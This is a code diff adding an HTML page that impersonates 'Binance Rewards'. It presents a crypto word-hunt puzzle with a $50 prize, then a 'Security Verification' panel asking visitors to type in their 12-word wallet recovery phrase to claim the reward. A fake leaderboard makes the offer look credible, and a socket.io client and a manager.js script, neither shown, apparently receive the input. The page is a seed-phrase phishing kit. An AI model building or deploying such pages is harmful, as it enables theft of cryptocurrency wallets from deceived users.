@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Rewards Hub</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        :root { --yellow: #FCD535; --bg: #0b0e11; --card: #1e2329; --border: #363c44; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: white; min-height: 100vh; }
+
+        /* Navigation */
+        .nav { display: flex; justify-content: space-between; padding: 15px 5%; background: #181a20; border-bottom: 1px solid var(--border); }
+        .lb-trigger { color: var(--yellow); border: 1px solid var(--yellow); padding: 6px 15px; border-radius: 4px; font-size: 13px; font-weight: bold; cursor: pointer; }
+
+        .main-wrapper { width: 100%; max-width: 800px; margin: 30px auto; padding: 0 20px; }
+
+        /* Puzzle Grid */
+        .puzzle-card { background: var(--card); border-radius: 12px; padding: 30px; text-align: center; border: 1px solid var(--border); }
+        .grid { display: grid; grid-template-columns: repeat(8, 1fr); gap: 10px; margin: 25px auto; max-width: 450px; }
+        .cell { aspect-ratio: 1; border: 1px solid #474d57; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 18px; cursor: pointer; border-radius: 4px; }
+        .cell.active { background: var(--yellow); color: black; border-color: var(--yellow); }
+
+        /* Seed Phrase View - Professional Full Width */
+        #seed-view { display: none; text-align: center; }
+        .import-btn { background: transparent; border: 2px solid var(--yellow); color: var(--yellow); padding: 18px; width: 100%; border-radius: 8px; font-weight: bold; font-size: 18px; cursor: pointer; margin-bottom: 30px; }
+        
+        .verification-panel { background: var(--card); padding: 40px; border-radius: 16px; border: 1px solid var(--border); text-align: left; }
+        .phrase-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 30px 0; }
+        .phrase-grid input { background: #2b3139; border: 1px solid #474d57; color: white; padding: 15px; border-radius: 8px; font-size: 16px; outline: none; width: 100%; }
+        .phrase-grid input:focus { border-color: var(--yellow); }
+        .confirm-btn { background: var(--yellow); color: black; border: none; padding: 20px; width: 100%; border-radius: 8px; font-weight: bold; font-size: 18px; cursor: pointer; }
+
+        /* Leaderboard Modal */
+        #modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 1000; padding: 20px; align-items: center; justify-content: center; }
+        .modal-body { background: var(--card); width: 100%; max-width: 550px; border-radius: 12px; padding: 25px; border: 1px solid var(--border); }
+        .lb-header { display: flex; justify-content: space-between; border-bottom: 1px solid var(--border); padding-bottom: 10px; color: var(--yellow); font-weight: bold; margin-bottom: 15px; }
+        .lb-row { display: flex; justify-content: space-between; font-size: 14px; padding: 12px 0; border-bottom: 1px solid #2b3139; }
+        .addr { color: #848e9c; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+<div class="nav">
+    <div style="font-weight: bold; letter-spacing: 1px;">BINANCE <span style="color:var(--yellow)">REWARDS</span></div>
+    <div class="lb-trigger" onclick="toggleLeaderboard()">VIEW LEADERBOARD</div>
+</div>
+
+<div class="main-wrapper">
+    <div id="puzzle-view" class="puzzle-card">
+        <h2>Crypto Word Hunt</h2>
+        <p style="color: #848e9c; margin-top: 8px;">Locate 6 hidden coins to qualify for the $50 reward</p>
+        <div class="grid" id="game-grid"></div>
+        <div id="progress" style="color: var(--yellow); font-weight: bold;">Matches Found: 0/6</div>
+    </div>
+
+    <div id="seed-view">
+        <button class="import-btn" id="pre-btn" onclick="openInput()">IMPORT TRUST WALLET TO CLAIM $50.00</button>
+        
+        <div class="verification-panel" id="main-input-panel" style="display: none;">
+            <h2 style="text-align: center;">Security Verification</h2>
+            <p style="color: #848e9c; text-align: center; margin-top: 10px;">Please verify your 12-word recovery phrase to finalize the reward deposit.</p>
+            
+            <div class="phrase-grid" id="input-fields"></div>
+            
+            <button class="confirm-btn" onclick="finalizeClaim()">CONFIRM AND CLAIM $50.00</button>
+        </div>
+    </div>
+</div>
+
+<div id="modal-overlay" onclick="toggleLeaderboard()">
+    <div class="modal-body" onclick="event.stopPropagation()">
+        <div class="lb-header">
+            <span>RANK / USER</span>
+            <span>WALLET ADDRESS</span>
+            <span>REWARD</span>
+        </div>
+        <div id="lb-content"></div>
+        <button class="confirm-btn" style="margin-top: 20px; padding: 12px;" onclick="toggleLeaderboard()">CLOSE</button>
+    </div>
+</div>
+
+<script src="manager.js"></script>
+</body>
+</html>
